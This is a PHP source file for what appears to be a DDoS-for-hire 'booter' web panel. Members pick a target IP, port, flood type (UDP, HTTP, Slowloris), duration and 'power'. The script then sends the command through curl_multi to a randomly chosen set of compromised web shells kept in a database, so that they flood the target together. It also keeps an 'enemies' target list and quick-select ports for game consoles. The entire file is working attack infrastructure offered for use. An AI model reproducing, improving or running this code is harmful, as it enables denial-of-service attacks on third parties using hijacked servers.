<?php

set_time_limit(0);
require_once "core.php";

if (!isMember) redirect('index.php');

require_once THEME."header.php";
require_once THEME."nav.php";

$host = isset($_POST['host']) ? htmlentities($_POST['host']) : "";
$type = isset($_POST['type']) ? htmlentities($_POST['type']) : "";
$port = isset($_POST['port']) ? htmlentities($_POST['port']) : "";
$time = isset($_POST['time']) ? htmlentities($_POST['time']) : "";
$power = isset($_POST['power']) ? htmlentities($_POST['power']) : "";

view_stats();

opencontent("DDoS Attack");

echo "<form name='booter' action='' method='post'>\n";
echo "<center>\n";

if (isset($_POST['boot'])) {
	
	$errors = "";
	$waittime = $userinfo['nextboot'] - time();
	
	if ($waittime > 0)
		$errors .= "You need to wait ".$waittime." more seconds.<br />\n";

	if ($host == "") {
		$errors .= "You did not specify a target.<br />\n";
	} else {

		$isfriend = mysql_num_rows(mysql_query("SELECT * FROM friends WHERE ip='".$host."' LIMIT 1"));
		$isblacklisted = mysql_num_rows(mysql_query("SELECT * FROM blacklist WHERE ip='".$host."' LIMIT 1"));

		$host = gethostbyname($host);

		if ($isblacklisted == 0)
			$isblacklisted = mysql_num_rows(mysql_query("SELECT * FROM blacklist WHERE ip='".$host."' LIMIT 1"));

		$filter = filter_var($host, FILTER_VALIDATE_IP);
		if (!$filter)
			$errors .= "You entered an invalid IP.<br />\n";		

		if ($isfriend == 1)
			$errors .= "You cannot boot a friend.<br />\n";

		if ($isblacklisted == 1) {
			$errors .= "This host is blacklisted.<br />\n";
			$log_attack = mysql_query("INSERT INTO logs (username, ip, type, target, duration, power, time, port, path, blacklisted) VALUE ('".$userinfo['username']."', '".	$_SERVER['REMOTE_ADDR']."', '".$type."', '".$host."', '".$time."', '".$power."', '".time()."', ".$port.", '".$page."', 1)") or die(mysql_error());
		}

	}
		
	if ($port == "" && $type != "http")
		$errors .= "You did not specify a port.<br />\n";
		
	if ($time == "")
		$errors .= "You did not specify a time.<br />\n";

	if ($type == "")
		$errors .= "You entered an invalid flood type.<br />\n";

	if (!is_numeric($port))
		$errors .= "You entered an invalid port.<br />\n";

	if ((0 > $port) || ($port > 65000))
		$errors .= "Port must be between 0 and 65000.<br />\n";

	if (!is_numeric($time))
		$errors .= "You entered an invalid time.<br />\n";

	if ((10 > $time) || ($time > $settings['maxtime']))
		$errors .= "Time must be between 10 and ".$settings['maxtime']." seconds.<br />\n";

	if (!is_numeric($power))
		$errors .= "Power must be numeric.<br />\n";

	if (($power < 1) || ($power > 100))
		$errors .= "Power must be between 1 and 100.<br />\n";

	if ($errors == "") {

		if ($type == "http") $port = 80;
		if ($port == 0) $port = 'rand';
		
		if ($type != "http")
			$curlrequest = "?act=phptools&type=".$type."&host=".$host."&time=".$time."&port=".$port;
		else
			$curlrequest = "?act=phptools&type=http&host=".$host."&port=80&page=".$page."&time=".$time;
		
		ignore_user_abort(TRUE);

		$log_attack = mysql_query("INSERT INTO logs (username, ip, type, target, duration, power, time, port, path) VALUE ('".$userinfo['username']."', '".	$_SERVER['REMOTE_ADDR']."', '".$type."', '".$host."', '".$time."', '".$power."', '".time()."', ".$port.", '".$page."')") or die(mysql_error());
		
		$count = intval(round($myshells * $power / 100));

		$getshells = mysql_query("SELECT * FROM shells WHERE status = 'up' ORDER BY RAND() LIMIT ".$count) or die(mysql_error());
		$select = mysql_query("SELECT * FROM shells WHERE status = 'up' ORDER BY RAND() LIMIT ".$count) or die(mysql_error());
		
		$mh = curl_multi_init();								
		$handles = array();
	
		while ($item = mysql_fetch_array($select)) {
		
			$ch = curl_init($item['url'].$curlrequest);
			curl_setopt($ch, CURLOPT_TIMEOUT, 5);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_multi_add_handle($mh, $ch);
			$handles[] = $ch;

		}

		$running = null;
		
		do {
			curl_multi_exec($mh,$running);
			usleep(200000);
		} while ($running > 0);

		foreach($handles as $ch)
			curl_multi_remove_handle($mh, $ch);
								
		curl_multi_close($mh);
		echo "<span style='color: #00cc00;'>Booting ".$host." on port ".$port." for ".$time." seconds with ".$power."% power.</span>\n";

		if (isAdmin) {
			$nextboot = time();
		} else {
			$nextboot = time() + $time + $settings['waittime'];
			if ($time >= 100) $nextboot += 20;
		}
		
		$update = mysql_query("UPDATE users SET nextboot='".$nextboot."' WHERE user_id = ".$userinfo['user_id']." LIMIT 1") or die(mysql_error());

	} else {	
		echo "<span style='color: red;'>".$errors."</span>\n";
	}

} else {
	echo 'Use the form below to initiate an attack:';
}

echo "</center><br />\n";

if ($page == "") $page = "HTTP Only";

echo "<table cellpadding='5' cellspacing='5' style='text-align: left;'>\n<tr>\n";
echo "<td style='text-align: right;' valign='middle'>Flood Type</td>\n";
echo "<td>\n";
echo "<select onchange='toggleHTTP();' name='type' id='type'>\n";
echo "<option value='udp'>UDP</option>\n";
echo "<option value='http'>HTTP</option>\n";
echo "<option value='slowloris'>Slowloris</option>\n";
echo "</select></td>\n";
echo "</tr>\n";

$enemies = mysql_query("SELECT * FROM enemies WHERE username = '".$userinfo['username']."'");
	
if (mysql_num_rows($enemies) > 0) {

	echo "<tr>\n";
	echo "<td style='text-align: right;' valign='middle'>Select Enemy<div style='font-size: 9px;'>(Optional)</div></td>\n";
	echo "<td valign='middle'>\n";
	echo "<select onchange='document.getElementById(\"host\").value=this.value;'>\n";
	echo "<option value=''>-Select-</option>\n";

	while ($enemy = mysql_fetch_array($enemies))
		echo "<option value='".$enemy['ip']."'>".$enemy['description']."</option>\n";

	echo "</select>\n</td>\n</tr>\n";

} else {

	echo "<tr>\n";
	echo "<td style='text-align: right;' valign='middle'>Select Enemy<div style='font-size: 9px;'>(Optional)</div></td>\n";
	echo "<td valign='middle'>\n";
	echo "<select onchange='window.location.href=this.value;'>\n";
	echo "<option value='#'>-Select-</option>\n";
	echo "<option value='enemies.php'>Add Enemies</option>\n\n";
	echo "</select></td>\n</tr>\n";

}

echo "<tr>\n";
echo "<td style='text-align: right;'>Target</td>\n";
echo "<td width='50%'><input type='text' name='host' id='host' size='30' value='".$target."' /></td>\n";
echo "</tr>\n<tr id='pathname'>\n";
echo "<td style='text-align: right;'>Pathname</td>\n";
echo "<td width='50%'><input type='text' name='page' id='page' size='30' disabled='true' value='".$page."'></td>\n";
echo "</tr>\n<tr>\n";
echo "<td style='text-align: right;' valign='middle'>Quick Port<div style='font-size: 9px;'>(Optional)</div></td>\n";
echo "<td valign='middle'>\n";
echo "<select id='qport' onchange='document.getElementById(\"port\").value=this.value;'>\n";
echo "<option value='3074'>-Select-</option>\n";
echo "<option value='21'>21 (FTP)</option>\n";
echo "<option value='22'>22 (SFTP)</option>\n";
echo "<option value='80'>80 (HTTP)</option>\n";
echo "<option value='3074'>3074 (XBL)</option>\n";
echo "<option value='3478'>3478 (PSN)</option>\n";
echo "<option value='3479'>3479 (PSN)</option>\n";
echo "<option value='6667'>6667 (IRC)</option>\n";
echo "<option value='27015'>27015 (Steam)</option>\n";
echo "</select>\n";
echo "</td>\n";
echo "</tr>\n<tr>\n";
echo "<td style='text-align: right;'>Port (0 For Random)</td>\n";
echo "<td width='50%'><input size='5' name='port' type='text' id='port' value='3074'></td>	\n";
echo "</tr>\n<tr>\n";
echo "<td style='text-align: right;' valign='middle'>Time:</td>\n";
echo "<td><input type='text' name='time' size='2' value='25' /> seconds</td>\n";
echo "</tr>\n<tr>\n";
echo "<td style='text-align: right;' valign='middle'>Power:</td>\n";
echo "<td><input type='text' name='power' size='2' value='50' /> %</td>\n";
echo "</tr>\n<tr>\n";
echo "<td colspan='2' valign='right' style='text-align: right;'><input type='submit' name='boot' class='button' value='Flood' /></td>\n";
echo "</tr>\n</table>\n\n";

echo "<script type='text/javascript'>

function toggleHTTP() {
	if (document.getElementById('type').value == 'http') {
		document.getElementById('page').disabled = false;
		document.getElementById('page').value = '/index.php';
		document.getElementById('qport').disabled = true;
		document.getElementById('port').disabled = true;
		document.getElementById('port').value = 80;
	} else {
		document.getElementById('page').disabled = true;
		document.getElementById('page').value = 'HTTP Only';
		document.getElementById('qport').disabled = false;
		document.getElementById('port').disabled = false;
	}
}

</script>\n";
echo "</form>\n";

closecontent();

require_once THEME."footer.php";

?>